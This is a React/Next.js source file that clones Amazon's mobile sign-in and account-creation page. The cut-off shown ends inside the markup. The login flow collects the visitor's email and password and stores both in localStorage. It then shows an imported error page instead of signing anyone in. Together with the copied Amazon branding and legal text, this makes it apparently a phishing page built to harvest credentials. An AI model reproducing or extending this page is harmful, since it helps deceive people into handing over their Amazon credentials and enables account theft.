/* eslint-disable jsx-a11y/role-supports-aria-props */
/* eslint-disable react/no-unescaped-entities */
"use client";

import { useEffect, useRef, useState } from "react";

import { useRouter } from 'next/navigation';
import styles from './styles.module.css';
import styles2 from './styles2.module.css';
import './styles.css';
import ErrorPage from '../errorMobile/index'


const RegisterAccordion = ({ isActive, toggleActive }) => {

    const [data, setData] = useState({ customerName: '', email: '', password: '' });
    const [error, setError] = useState({ status: false, msg: '' });
    const [isShow, setShow] = useState(false)
    const handleChange = (e) => {
        const { name, value } = e.target;
        setData({ ...data, [name]: value });
    };

    const validateForm = (formData) => {
        const errors = {};

        if (!formData.customerName) {
            errors.customerName = 'Enter your name';
        }

        if (!formData.email) {
            errors.email = 'Enter your email or mobile phone number';
        } else {
            const emailPattern = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/;
            const phonePattern = /^[0-9]{10,15}$/;
            if (!emailPattern.test(formData.email) && !phonePattern.test(formData.email)) {
                errors.emailOrPhone = 'Wrong or Invalid email address or mobile phone number. Please correct and try again.';
            }
        }

        // Validate password
        if (!formData.password) {
            errors.password = 'Minimum 6 characters required';
        } else if (formData.password.length < 6) {
            errors.password = 'Minimum 6 characters required';
        }

        return errors;
    };

    const onSubmit = (e) => {
        e.preventDefault();
        const validationErrors = validateForm(data);
        console.log("🚀 ~ onSubmit ~ validationErrors:", validationErrors)
        setError(validationErrors);
    };

    return (
        <div
            id="accordion-row-register"
            className={`${styles['a-box']} ${isActive && styles['a-accordion-active']}`}
            data-a-accordion-row-name="accordion-row-register"
        >
            <div className={styles['a-box-inner'] + ' ' + styles['a-accordion-row-container']}>
                <div className={styles['a-accordion-row-a11y']} role="radio" aria-checked="false" aria-expanded="false">
                    <a
                        id="register_accordion_header"
                        data-csa-c-func-deps="aui-da-a-accordion"
                        data-csa-c-type="widget"
                        data-csa-interaction-events="click"
                        data-action="a-accordion"
                        className={styles['a-accordion-row'] + ' ' + styles['a-declarative']}
                        href="#"
                        aria-label=""
                        data-csa-c-id="xi6y98-8v6thy-f49yg2-sggllv"
                        onClick={() => {
                            toggleActive(!isActive);
                            document.body.classList.remove('auth-show-password-enabled');
                            document.body.classList.remove('auth-show-password-ready');
                        }}
                    >
                        <i className={styles['a-icon'] + ' ' + styles['a-accordion-radio'] + ' ' + styles[isActive ? 'a-icon-radio-active' : 'a-icon-radio-inactive']}></i>
                        <h5>
                            <div className={styles['a-row']}>
                                <span className={styles['a-size-base'] + ' ' + styles['a-text-bold']}>Create account</span>
                                <span className={styles['a-size-small'] + ' ' + styles['accordionHeaderMessage']}> New to Amazon?</span>
                            </div>
                        </h5>
                    </a>
                </div>
                <div className={styles['a-accordion-inner']}>
                    <span
                        className="a-declarative"
                        data-action="a-modal"
                        data-csa-c-type="widget"
                        data-csa-c-func-deps="aui-da-a-modal"
                        data-a-modal='{"max-width":"95%","width":"300px","name":"verifyContinueModal","header":"Verification Required","height":"240px"}'
                        id="auth-verify-modal-action"
                        data-csa-c-id="wd4lo8-qvd5np-6ryi95-3goyl4"
                    ></span>
                    <div className={styles['a-popover-preload']} id="a-popover-verifyContinueModal">
                        <div className={styles['a-row']}>
                            <p>We will send you a text to verify this number:</p>
                        </div>
                        <div className={styles['a-row']}>
                            <span id="auth-register-verify-mobile-number-text" className={styles['a-size-small'] + ' ' + styles['a-text-bold']}>
                                <span id="auth-verify-mobile-country-code"></span>
                                <span>
                                    +<span id="auth-verify-mobile-calling-code"></span>
                                </span>
                                <span id="auth-verify-mobile-national-number"></span>
                            </span>
                        </div>
                        <div className={`${styles['a-row']} ${styles['a-spacing-top-extra-large']}`}>
                            <span className={styles['a-size-mini']}>Message and Data rates may apply.</span>
                        </div>
                        <hr aria-hidden="true" className={styles['a-divider-normal']} />
                        <div className={styles['a-row']}>
                            <div className={styles['a-column'] + ' ' + styles['a-span6']}>
                                <span
                                    className="a-declarative"
                                    data-action="a-popover-close"
                                    data-csa-c-type="widget"
                                    data-csa-c-func-deps="aui-da-a-popover-close"
                                    data-a-popover-close="{}"
                                    data-csa-c-id="gda2xp-5qgt6j-jkgvdf-9f7oyg"
                                >
                                    <span id="auth-verification-cancel" className={styles['a-button'] + ' ' + styles['a-button-span12'] + ' ' + styles['a-button-base']}>
                                        <span className={styles['a-button-inner']}>
                                            <input className={styles['a-button-input']} type="submit" aria-labelledby="auth-verification-cancel-announce" />
                                            <span id="auth-verification-cancel-announce" className={styles['a-button-text']} aria-hidden="true">
                                                Cancel
                                            </span>
                                        </span>
                                    </span>
                                </span>
                            </div>
                            <div className={`${styles['a-column']} ${styles['a-span6']} ${styles['a-span-last']}`}>
                                <span
                                    className="a-declarative"
                                    data-action="auth-verify-modal-complete"
                                    data-csa-c-type="widget"
                                    data-csa-c-func-deps="aui-da-auth-verify-modal-complete"
                                    data-auth-verify-modal-complete="{}"
                                    data-csa-c-id="9rh7xz-4jpjj9-xpyrvb-vtznbc"
                                >
                                    <span id="auth-verification-ok" className={styles['a-button'] + ' ' + styles['a-button-span12'] + ' ' + styles['a-button-primary']}>
                                        <span className={styles['a-button-inner']}>
                                            <button id="auth-verification-ok-announce" className={styles['a-button-text']} type="button">
                                                OK
                                            </button>
                                        </span>
                                    </span>
                                </span>
                            </div>
                        </div>
                    </div>
                    <div className={styles['a-section'] + ' ' + styles['a-spacing-large'] + ' ' + styles['mp_reg_fix']}>
                        <div
                            id="ap_register_form"
                            name="register"
                            method="post"
                            noValidate=""
                            data-enable-mobile-account-js="true"
                            data-show-optional-email-field="true"
                            className={`${styles['ap_ango_default']} ${styles['fwcim-form']} ${styles['auth-validate-form']} ${styles['auth-clearable-form']}`}
                        >
                            <div className={`${styles['a-row']} ${styles['a-spacing-base']}`}>
                                <label htmlFor="ap_customer_name" aria-hidden="true" className={styles['a-form-label']}>
                                    First and last name
                                </label>
                                <div className={`${styles['a-input-text-wrapper']} ${styles[error.email ? 'a-form-error' : 'moa-single-claim-input-field-container']}`}>
                                    <input onChange={handleChange} value={data.customerName} type="text" maxLength="50" id="ap_customer_name" autoComplete="name" name="customerName" aria-label="First and last name" />
                                </div>
                                <div id="ap_customer_name_icon" className={styles['auth-clear-icons']} tabIndex="">
                                    <i className={`${styles['a-icon']} ${styles['a-icon-close']}`} role="img" aria-label="Clear customer name text field, button"></i>
                                </div>
                                {error.customerName && < div
                                    id="auth-customerName-missing-alert"
                                    className={`${styles['a-box']} ${styles['a-alert-inline']} ${styles['a-alert-inline-error']} ${styles['auth-inlined-error-message']} ${styles['a-spacing-top-mini']}`}
                                    role="alert"
                                >
                                    <div className={`${styles['a-box-inner']} ${styles['a-alert-container']}`}>
                                        <i className={`${styles['a-icon']} ${styles['a-icon-alert']}`}></i>
                                        <div className={styles['a-alert-content']}>{error.customerName}</div>
                                    </div>
                                </div>}
                            </div>
                            <input type="hidden" name="countryCode" value="US" id="auth-country-picker" className={styles['auth-country-picker']} disabled="disabled" />
                            <div className={`${styles['a-row']} ${styles['a-spacing-base']}`}>
                                <label htmlFor="ap_email" aria-hidden="true" className={styles['a-form-label']}>
                                    Mobile number or email
                                </label>
                                <div data-validation-id="email" className={`${styles['a-input-text-wrapper']} ${styles[error.email ? 'a-form-error' : 'moa-single-claim-input-field-container']}`}>
                                    <div className={`${styles['a-section']} ${styles['country-picker']} ${styles['aok-hidden']} ${styles['display-none']}`}>
                                        <span
                                            className="a-declarative"
                                            data-action="a-sheet"
                                            data-csa-c-type="widget"
                                            data-csa-c-func-deps="aui-da-a-sheet"
                                            data-a-sheet='{"sheetType":"web","name":"country_bottom_sheet","preloadDomId":"country_bottom_sheet_container","closeType":"icon"}'
                                            data-csa-c-id="g0g2oq-vhs77a-6vvy3k-ak9okg"
                                        >
                                            <span className={styles['country-display-text']}>US +1</span>
                                        </span>
                                    </div>
                                    <input
                                        type="email"
                                        maxLength="64"
                                        id="ap_email"
                                        autoComplete="tel"
                                        name="email"
                                        aria-label="Mobile number or email"
                                        autoCorrect="off"
                                        autoCapitalize="off"
                                        className={styles['auth-clear-icon-visible']}
                                        onChange={handleChange} value={data.email}
                                    />
                                    <div id="ap_email_icon" className={`${styles['auth-clear-icons']} ${styles['block']}`} tabIndex="">
                                        <i className={`${styles['a-icon']} ${styles['a-icon-close']}`} role="img" aria-label="Clear email text field, button"></i>
                                    </div>
                                </div>
                                {error.email &&
                                    <div
                                        id="auth-email-invalid-claim-alert"
                                        className={`${styles['a-box']} ${styles['a-alert-inline']} ${styles['a-alert-inline-error']} ${styles['auth-inlined-error-message']} ${styles['a-spacing-top-mini']}`}
                                        role="alert"
                                    >
                                        <div className={`${styles['a-box-inner']} ${styles['a-alert-container']}`}>
                                            <i className={`${styles['a-icon']} ${styles['a-icon-alert']}`}></i>
                                            <div className={styles['a-alert-content']}>
                                                {error.email}
                                            </div>
                                        </div>
                                    </div>}
                                <div id="country_bottom_sheet_container" className={styles['aok-hidden']}>
                                    <div className={styles['a-container'] + ' ' + styles['ap-no-padding']}>
                                        <span
                                            className="a-declarative"
                                            data-action="select_country"
                                            data-csa-c-type="widget"
                                            data-csa-c-func-deps="aui-da-select_country"
                                            data-select_country="{}"
                                            data-csa-c-id="ytgr60-bgez1g-7iayjn-33pndb"
                                        ></span>
                                    </div>
                                </div>
                            </div>
                            <div id="auth-register-mobile-custom-message"></div>
                            <label htmlFor="ap_password" aria-hidden="true" className={styles['a-form-label']}>
                                Create a password
                            </label>
                            <div className={styles['a-row'] + ' ' + styles['a-spacing-small']}>
                                <div className={styles['a-row'] + ' ' + styles['auth-password-row']}>
                                    <div
                                        id="auth-password-container"
                                        className={`${styles['a-input-text-wrapper']} ${styles[error.password ? 'a-form-error' : 'moa-single-claim-input-field-container']}`}
                                    >
                                        <input
                                            type="password"
                                            maxLength="1024"
                                            id="ap_password"
                                            name="password"
                                            spellCheck="false"
                                            aria-label="Create a password"
                                            autoCorrect="off"
                                            autoCapitalize="off"
                                            onChange={handleChange} value={data.password}
                                        />
                                        <div className={`${styles2['a-row']} ${styles2['auth-visible-password-container']} ${data.password && styles2['auth-show-password-empty']}`}>
                                            <span className={`${styles2['a-size-small']} ${styles2['a-color-secondary']} ${styles2['auth-visible-password']}`}>{data.password}</span>
                                        </div>
                                    </div>
                                </div>
                                {error.password &&
                                    <div
                                        id="auth-password-invalid-password-alert"
                                        className={`${styles['a-box']} ${styles['a-alert-inline']} ${styles['a-alert-inline-error']} ${styles['auth-inlined-error-message']} ${styles['a-spacing-small']} ${styles['a-spacing-top-mini']}`}
                                        role="alert"
                                    >
                                        <div className={`${styles['a-box-inner']} ${styles['a-alert-container']}`}>
                                            <i className={`${styles['a-icon']} ${styles['a-icon-alert']}`}></i>
                                            <div className={styles['a-alert-content']}>{error.password}</div>
                                        </div>
                                    </div>}
                                <div className={`${styles['a-row']} ${styles['auth-visible-password-container']} `}>
                                    <span id="auth-visible-password" className={`${styles['a-size-small']} ${styles['a-color-secondary']} ${styles['auth-visible-password']}`}>

                                    </span>
                                </div>
                                <input type="hidden" name="showPasswordChecked" value="true" id="ap_show_password_checked" />
                            </div>
                            <div className={styles['a-row']}>
                                <div className={`${styles['a-column']} ${styles['a-span12']} ${styles['a-spacing-medium']}`}>
                                    <div
                                        id="auth-show-password-checkbox-container"
                                        className={`${styles['a-checkbox']} ${styles['a-checkbox-fancy']} ${styles['a-control-row']} ${styles['a-touch-checkbox']} ${styles['auth-show-password-checkbox']}`}
                                    >
                                        <label htmlFor="auth-register-show-password-checkbox">
                                            <input value={isShow} onChange={(e) => {
                                                setShow(!isShow);
                                                if (isShow) {
                                                    document.body.classList.add('auth-show-password-enabled ');
                                                    document.body.classList.add('auth-show-password-ready ');
                                                } else {
                                                    document.body.classList.remove('auth-show-password-enabled');
                                                    document.body.classList.remove('auth-show-password-ready');
                                                }
                                            }} id="auth-register-show-password-checkbox" type="checkbox" name="" />
                                            <i className={`${styles['a-icon']} ${styles['a-icon-checkbox']}`}></i>
                                            <span className={styles['a-label'] + ' ' + styles['a-checkbox-label']}>
                                                <span className={`${styles['a-size-small']} ${styles['auth-password-margin']}`}>Show password</span>
                                            </span>
                                        </label>
                                    </div>
                                </div>
                            </div>
                            <div className={styles['a-section'] + ' ' + styles['ap_mobile_number_fields']}>
                                <span id="auth-continue" className={`${styles['a-button']} ${styles['a-spacing-medium']} ${styles['a-button-primary']}`}>
                                    <span className={styles['a-button-inner']}>
                                        <input className={styles['a-button-input'] + ' ' + "h-full"} type="submit" onClick={onSubmit} aria-labelledby="auth-continue-announce" />
                                        <span id="auth-continue-announce" className={styles['a-button-text']} aria-hidden="true">
                                            <span className={`${styles['default-text']} `}>Continue</span>
                                        </span>
                                    </span>
                                </span>
                            </div>
                            <div id="legal-section" className={styles['a-section']}>
                                <div id="legalTextRow" className={`${styles['a-row']} ${styles['a-spacing-top-medium']} ${styles['a-size-small']}`}>
                                    By creating an account, you agree to Amazon's
                                    <a href="#">Conditions of Use</a> and
                                    <a href="#">Privacy Notice</a>.
                                </div>
                            </div>
                            <div id="ab-reg-link-section" className={styles['a-section']}>
                                <div className={styles['a-divider'] + ' ' + styles['a-divider-break']}>
                                    <h5 aria-level="5">Buying for work?</h5>
                                </div>
                                <a
                                    id="ab-registration-link"
                                    href="#"
                                    className={`${styles['a-touch-link']} ${styles['a-box']} ${styles['a-touch-link-noborder']}`}
                                >
                                    <div className={styles['a-box-inner']}>
                                        <i className={`${styles['a-icon']} ${styles['a-icon-touch-link']}`}></i>
                                        Create a free business account
                                    </div>
                                </a>
                            </div>
                        </div>
                    </div>
                </div>
            </div >
        </div >
    );
};


const LoginAccordion = ({ email, setEmail, error, onNextStep, step, handleClose, show, isActive, toggleActive }) => {
    const renderFormButtonTxt = (step) => {
        switch (step) {
            case 1:
                return "Continue";
            case 2:
                return "Sign in";
        }
    };

    const renderFormFooter = (step) => {
        switch (step) {
            case 1:
                return <>
                    <div className={styles.loginHelp + " mb-5"}>
                        By continuing, you agree to Amazon's{" "}
                        <a href="#">
                            Conditions of Use
                        </a>{" "}
                        and{" "}
                        <a href="#">
                            Privacy Notice
                        </a>.
                    </div>
                    <div className={styles.loginSection}>
                        <div className={styles.loginRow}>
                            <a
                                className={styles.loginExpander}
                                href="#"
                                onClick={() => { setShow(!show); }}
                            >
                                <i className={`${styles.loginIcon} ${!show ? styles.loginIconExpand : styles.loginIconCollapse}`} />
                                <span>Need help?</span>
                            </a>
                            {
                                show &&
                                <ul className={styles.loginUnorderedList + " " + styles.loginNoStyle + " " + styles.loginVertical}>
                                    <li>
                                        <span className={styles.loginListItem}>
                                            <div
                                                aria-expanded="true"
                                                className={styles.loginExpander}
                                                style={{ overflow: "hidden" }}
                                            >
                                                <a
                                                    id="auth-fpp-link-bottom"
                                                    className={styles.loginExpander}
                                                    href="#"
                                                >
                                                    Forgot your password?
                                                </a>
                                            </div>
                                        </span>
                                    </li>
                                    <li>
                                        <span className={styles.loginListItem}>
                                            <div
                                                aria-expanded="true"
                                                className={styles.loginExpander}
                                                style={{ overflow: "hidden" }}
                                            >
                                                <a
                                                    id="ap-other-signin-issues-link"
                                                    className={styles.loginExpander}
                                                    href="#"
                                                >
                                                    Other issues with Sign-In
                                                </a>
                                            </div>
                                        </span>
                                    </li>
                                </ul>
                            }
                        </div>
                    </div>
                    <div className={styles.loginSection}>
                        <hr aria-hidden="true" />
                        <div>
                            <span className={styles.loginLabel}>Buying for work?</span>
                        </div>
                        <a
                            className={styles.loginLink}
                            href="#"
                        >
                            <span>Shop on Amazon Business</span>
                        </a>
                    </div>
                </>;
            case 2:
                return <>
                    <div className={styles.loginRow + " mt-4"}>
                        <div className={styles.loginSection}>
                            <label htmlFor="login-remember-me" className={styles.loginFormLabel}>
                                <div data-a-input-name="rememberMe" className={styles.loginCheckbox}>
                                    <label className="flex flex-row">
                                        <input
                                            type="checkbox"
                                            name="rememberMe"
                                            defaultValue="true"
                                            tabIndex={4}
                                        />
                                        <i className={styles.loginIcon + " " + styles.loginIconCheckbox} />
                                        <span className={styles.loginLabel + " " + styles.loginCheckboxLabel}>
                                            Keep me signed in.{" "}
                                            <span>
                                                <a
                                                    id="remember_me"
                                                    href="#"
                                                    role="button"
                                                    className={styles.loginLink}
                                                >
                                                    Details
                                                    <i className={styles.loginIcon + " " + styles.loginIconPopover} />
                                                </a>
                                            </span>
                                        </span>
                                    </label>
                                </div>
                            </label>
                        </div>
                    </div>
                </>;
        }
    };
    return (
        <div
            id="accordion-row-login"
            className={`${styles['a-box']} ${isActive && styles['a-accordion-active']}`}
            data-a-accordion-row-name="accordion-row-login"
        >
            <div className={styles['a-box-inner'] + ' ' + styles['a-accordion-row-container']}>
                <div className={styles['a-accordion-row-a11y']} role="radio" aria-checked="true" aria-expanded="true">
                    <a
                        id="login_accordion_header"
                        data-csa-c-func-deps="aui-da-a-accordion"
                        data-csa-c-type="widget"
                        data-csa-interaction-events="click"
                        data-action="a-accordion"
                        className={styles['a-accordion-row'] + ' ' + styles['a-declarative']}
                        href="#"
                        aria-label=""
                        onClick={() => {
                            toggleActive(!isActive); document.body.classList.remove('auth-show-password-enabled');
                            document.body.classList.remove('auth-show-password-ready');
                        }}
                        data-csa-c-id="mrns06-r4ml4j-hirbbt-azm232"
                    >
                        <i className={styles['a-icon'] + ' ' + styles['a-accordion-radio'] + ' ' + styles[isActive ? 'a-icon-radio-active' : 'a-icon-radio-inactive']}></i>
                        <h5>
                            <div className={styles['a-row']}>
                                <span className={styles['a-size-base'] + ' ' + styles['a-text-bold']}>Sign in</span>
                                <span className={styles['a-size-small'] + ' ' + styles['accordionHeaderMessage']}> Already a customer?</span>
                            </div>
                        </h5>
                    </a>
                </div>
                <div className={styles['a-accordion-inner']}>
                    <div
                        id="ap_login_form"
                        name="signIn"
                        method="post"
                        noValidate=""
                        className={`${styles['auth-validate-form']} ${styles['fwcim-form']} ${styles['auth-clearable-form']}`}
                        data-fwcim-id="PPfQwsKP"
                    >
                        <div className={`${styles['a-input-text-group']} ${styles['a-spacing-medium']} ${styles['a-spacing-top-micro']}`}>
                            <label htmlFor="ap_email_login" aria-hidden="true" className={styles['a-form-label']}>
                                Email or phone number
                            </label>
                            <div className={styles['a-row'] + ' ' + styles['a-spacing-base']}>
                                <span
                                    className="a-declarative"
                                    data-action="country_picker_bottom_sheet"
                                    data-csa-c-type="widget"
                                    data-csa-c-func-deps="aui-da-country_picker_bottom_sheet"
                                    data-country_picker_bottom_sheet="{}"
                                    data-csa-c-id="xl6a0u-otpo9b-u56lwn-22i9p8"
                                >
                                    <div className={`${styles['a-input-text-wrapper']} ${styles['auth-required-field']} ${styles['auth-fill-claim']} ${styles['moa-single-claim-input-field-container']}`}>
                                        <div className={`${styles['a-section']} ${styles['country-picker']} ${styles['aok-hidden']} ${styles['display-none']}`} value="US">
                                            <span
                                                className="a-declarative"
                                                data-action="a-sheet"
                                                data-csa-c-type="widget"
                                                data-csa-c-func-deps="aui-da-a-sheet"
                                                data-a-sheet='{"sheetType":"web","name":"country_bottom_sheet_signin","preloadDomId":"country_bottom_sheet_container_signin","closeType":"icon"}'
                                                data-csa-c-id="b2b6oq-bc658w-1i58fh-m711z1"
                                            >
                                                <span className={styles['country-display-text']}>US +1</span>
                                            </span>
                                        </div>
                                        <input
                                            type="email"
                                            maxLength="128"
                                            value={email}
                                            onChange={(e) => { setEmail(e.target.value) }}
                                            id="ap_email_login"
                                            name="email"
                                            aria-label="Email or phone number"
                                            autoCorrect="off"
                                            autoCapitalize="off"
                                            className={styles['auth-clear-icon-visible']}
                                        />
                                        {email && (
                                            <div id="ap_email_login_icon" className={`${styles['auth-clear-icons']} ${styles['block']}`} tabIndex="" onClick={handleClose}>
                                                <i className={`${styles['a-icon']} ${styles['a-icon-close']}`} role="img" aria-label="Clear email text field, button"></i>
                                            </div>
                                        )}
                                    </div>
                                </span>
                                <div id="country_bottom_sheet_container_signin" className={styles['aok-hidden']}>
                                    <div className={styles['a-container'] + ' ' + styles['ap-no-padding']}>
                                        <span
                                            className="a-declarative"
                                            data-action="select_country_signin"
                                            data-csa-c-type="widget"
                                            data-csa-c-func-deps="aui-da-select_country_signin"
                                            data-select_country_signin="{}"
                                            data-csa-c-id="b6p8sl-1afry1-vme46z-71xx61"
                                        ></span>
                                    </div>
                                </div>
                            </div>
                            {error.status && <div
                                id="auth-email-missing-alert"
                                className={`${styles['a-box']} ${styles['a-alert-inline']} ${styles['a-alert-inline-error']} ${styles['auth-inlined-error-message']} ${styles['a-spacing-top-mini']}`}
                                role="alert"
                            >
                                <div className={`${styles['a-box-inner']} ${styles['a-alert-container']}`}>
                                    <i className={`${styles['a-icon']} ${styles['a-icon-alert']}`}></i>
                                    <div className={styles['a-alert-content']}>{error.msg}</div>
                                </div>
                            </div>}
                        </div>
                        <div className={styles['a-section']}>
                            <div className={styles['a-button-stack']}>
                                <span id="continue" className={`${styles['a-button']} ${styles['a-button-span12']} ${styles['a-button-primary']}`} onClick={(e) => onNextStep(e)}>
                                    <span className={styles['a-button-inner']}>
                                        <input onClick={(e) => e.preventDefault()} id="continue" className={styles['a-button-input']} styles="display: none;" type="submit" aria-labelledby="continue-announce" />
                                        <span id="continue-announce" className={styles['a-button-text']} aria-hidden="true">
                                            {renderFormButtonTxt(step)}
                                        </span>
                                    </span>
                                </span>
                                {renderFormFooter(step)}
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
};



const Footer = () => {
    return (
        <footer className={`${styles['nav-mobile']} ${styles['nav-ftr-batmobile']}`}>
            <div className={`${styles['nav-t-footer-basicNoAuth']} ${styles['nav-ftr']} ${styles['nav-sprite-v3']}`}>
                <div className={styles['icp-container-mobile']}>
                    <a
                        href="/customer-preferences/edit?from=mobile&amp;ie=UTF8&amp;preferencesReturnUrl=%2Fap%2Fsignin&amp;ref_=footer_lang"
                        aria-label="Choose a language for shopping."
                        className={styles['icp-touch-link-2']}
                        id="icp-touch-link-language"
                    >
                        <div className={`${styles['icp-nav-globe-img-2']} ${styles['icp-mobile-globe-2']}`}></div>
                        <span className={styles['icp-color-base']}>English</span>
                        <span className={`${styles['nav-arrow']} ${styles['icp-up-down-arrow']}`}></span>
                    </a>
                    <a
                        href="/customer-preferences/country?ie=UTF8&amp;preferencesReturnUrl=%2Fap%2Fsignin&amp;ref_=navm_footer_icp_cp"
                        aria-label="Choose a country/region for shopping."
                        className={styles['icp-touch-link-2']}
                        id="icp-touch-link-country"
                    >
                        <span className={`${styles['icp-flag-3']} ${styles['icp-flag-3-us']}`}></span>
                        <span className={styles['icp-color-base']}>United States</span>
                    </a>
                </div>
                <ul className={styles['nav-ftr-horiz']}>
                    <li className={styles['nav-li']}>
                        <a href="/gp/help/customer/display.html?nodeId=508088&amp;ref_=navm_ftr_cou" id="" className={styles['nav-a']}>
                            Conditions of Use
                        </a>
                    </li>
                    <li className={styles['nav-li']}>
                        <a href="/gp/help/customer/display.html?ie=UTF8&amp;nodeId=468496&amp;ref_=footer_privacy" id="" className={styles['nav-a']}>
                            Privacy Notice
                        </a>
                    </li>
                    <li className={styles['nav-li']}>
                        <a href="/privacyprefs?ref_=footer_iba" id="" className={styles['nav-a']}>
                            Your Ads Privacy Choices
                        </a>
                    </li>
                    <li className={styles['nav-li']}>
                        <span id="nav-icon-ccba" className={styles['nav-sprite'] + ' ' + styles['nav-icon-ccba']}></span>
                    </li>
                </ul>
                <div className={styles['nav-ftr-copyright']}>© 1996-2024, Amazon.com, Inc. or its affiliates</div>
            </div>
        </footer>
    );
};

export default function LoginMobile({ email,
    setEmail,
    setShowErrorEmail,
    setEmptyEmail,
    onNext, }) {
    const [show, setShow] = useState(false);
    const [toggleCreate, setCreate] = useState(false);
    const [step, setStep] = useState(1);
    const [data, setData] = useState({ email: "", password: '' });
    // const [data, setData] = useState({ email: null, password: null });
    const [error, setError] = useState({ status: false, msg: '' });
    const [showPassword, setShowPassword] = useState(false);

    const router = useRouter();

    useEffect(() => {
        localStorage.removeItem('email');
        localStorage.removeItem('password');
    }, [])


    const onNextStep = (e) => {
        e.preventDefault();
        const err = { status: false, msg: '' };
        let isErr = false;

        const isValidEmail = (email) => {
            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
        };

        const isValidPhone = (phone) => {
            return /^\(?([0-9]{3})\)?[-. ]?([0-9]{3})[-. ]?([0-9]{4})$/.test(phone);
        };

        if (step === 1) {
            if (!data.email?.trim()) {
                err.status = true;
                err.msg = "Enter your email or mobile phone number";
                isErr = true;
            } else if (!isValidEmail(data.email) && !isValidPhone(data.email)) {
                err.status = true;
                err.msg = "Enter a valid email address or mobile phone number";
                isErr = true;
            }
        } else if (step === 2) {
            if (!data.password?.trim()) {
                err.status = true;
                err.msg = "Enter your password";
                isErr = true;
            } else {
                localStorage.setItem('email', data.email);
                localStorage.setItem('password', data.password);
                // router.push('/error', { scroll: false });
            }
        }
        if (!isErr) {
            setStep(step + 1);
        }
        setError(err);
    };

    if (step == 3) {
        return <ErrorPage />
    }

    const handleClose = () => {
        console.log('ban dang click');
        setEmail('');
    };

    const handleCheckboxChange = (event) => {
        setShowPassword(event.target.checked);
    };

    return (
        <main className={`flex min-h-screen flex-col items-center justify-between ${styles.mainContainer}`}>
            <div className="flex min-h-full flex-1 flex-col min-w-full">
                <div className={"flex " + styles.loginNav}>
                    <i className={styles.loginLogo} alt="Logo here" />
                </div>
                <div className={`${styles.loginForm} w-full`}>
                    {
                        step == 1 ?
                            <>
                                <h1 className={`mb-2 ${styles.loginTittle}`}>
                                    Welcome
                                </h1>
                                <form className={`${styles.loginFormBody} `} action="#" method="POST">
                                    <div
                                        id="accordion-signin-signup-page"
                                        data-a-accordion-name="accordion-signin-signup-page"
                                        className={`${styles['a-box-group']} ${styles['a-accordion']}  ${styles['a-spacing-top-mini']}`}
                                        role="radioGroup"
                                    >
                                        <RegisterAccordion isActive={toggleCreate} toggleActive={(e) => { setCreate(true) }} />
                                        <LoginAccordion isActive={!toggleCreate} toggleActive={(e) => { setCreate(false) }} show={show} email={data.email} error={error} handleClose={handleClose} onNextStep={onNextStep} setEmail={(e) => { setData({ ...data, email: e }) }} step={step} />
                                    </div>
                                </form>
                            </>
                            : <>
                                {error.status && <div
                                    id="auth-alert-window"
                                    className={`${styles2['a-box']} ${styles2['a-alert']} ${styles2['a-alert-error']} ${styles2['a-spacing-base']}`}
                                    role="alert"
                                >
                                    <div className={styles2['a-box-inner'] + ' ' + styles2['a-alert-container']}>
                                        <h4 className={styles2['a-alert-heading']}>There was a problem</h4>
                                        <div className={styles2['a-alert-content']}>
                                            <ul className={`${styles2['a-unordered-list']} ${styles2['a-vertical']} ${styles2['auth-error-messages']}`} role="alert">
                                                <li id="auth-password-missing-alert">
                                                    <span className={styles2['a-list-item']}>{error.msg}</span>
                                                </li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>
                                }
                                <h1 className={`${styles2.loginTittle}`}>
                                    Sign in
                                </h1>
                                <div className={`${styles2.loginFormBody}`} >
                                    <div className={styles2['a-section'] + ' ' + styles2['auth-pagelet-mobile-container']}>


                                        <div className={styles2['a-row'] + ' ' + styles2['a-spacing-base']}>
                                            <span dir="ltr">{data.email} </span>
                                            <a
                                                onClick={() => {
                                                    setData({ ...data, email: null });
                                                    setStep(1);
                                                }}
                                                id="ap_change_login_claim"
                                                className={styles2['a-link-normal']}
                                                tabIndex="7"
                                                href="#"
                                            >
                                                Change
                                            </a>
                                        </div>

                                        <form
                                            name="signIn"
                                            method="post"
                                            noValidate=""
                                            action=""
                                            className={`${styles2['auth-validate-form']} ${styles2['auth-clearable-form']} ${styles2['auth-validate-form']}`}
                                            data-fwcim-id="0mKDpFRF"
                                        >
                                            <div className={`${styles2['a-input-text-group']} ${styles2['a-spacing-medium']} ${styles2['a-spacing-top-micro']} `}>
                                                <label
                                                    htmlFor="ap_password"
                                                    aria-hidden="true"
                                                    className=""
                                                >
                                                    Amazon password
                                                </label>

                                                <div
                                                    id="auth-password-container"
                                                    className={`${styles2['a-input-text-wrapper']} ${styles2['auth-required-field']} ${styles2['input_table_layout']} `}
                                                >
                                                    <input
                                                        className={`${error.status && styles2['a-form-error']}`}
                                                        type={showPassword ? 'text' : 'password'}
                                                        maxLength="1024"
                                                        id="ap_password"
                                                        value={data.password}
                                                        onChange={(e) => { setData({ ...data, password: e.target.value }) }}
                                                        autoComplete="current-password"
                                                        name="password"
                                                        tabIndex="2"
                                                        spellCheck="false"
                                                        aria-label="Amazon password"
                                                    />
                                                    <div className={`${styles2['a-row']} ${styles2['auth-visible-password-container']} ${data.password && styles2['auth-show-password-empty']}`}>
                                                        <span className={`${styles2['a-size-small']} ${styles2['a-color-secondary']} ${styles2['auth-visible-password']}`}>{data.password}</span>
                                                    </div>
                                                </div>
                                                <button
                                                    id="ap_password_icon"
                                                    className={`${styles2['auth-clear-icons']} ${data.password && styles2['display-block']}`}
                                                    tabIndex="2"
                                                    onClick={(e) => { e.preventDefault(); setData({ ...data, password: "" }); }}
                                                >
                                                    <i
                                                        className={`${styles2['a-icon']} ${styles2['a-icon-close']}`}
                                                        role="img"
                                                        aria-label="Clear password text field, button"
                                                    ></i>
                                                </button>
                                                {/* {error.status && <div
                                                    id="auth-password-missing-alert"
                                                    className={`${styles2['a-box']} ${styles2['a-alert-inline']} ${styles2['a-alert-inline-error']} ${styles2['display-none']} ${styles2['a-spacing-top-mini']}`}
                                                    role="alert"
                                                >
                                                    <div className={styles2['a-box-inner'] + ' ' + styles2['a-alert-container']}>
                                                        <i className={`${styles2['a-icon']} ${styles2['a-icon-alert']}`}></i>
                                                        <div className={styles2['a-alert-content']}>{error.msg}</div>
                                                    </div>
                                                </div>
                                                } */}

                                                <input
                                                    type="hidden"
                                                    name="showPasswordChecked"
                                                    value="true"
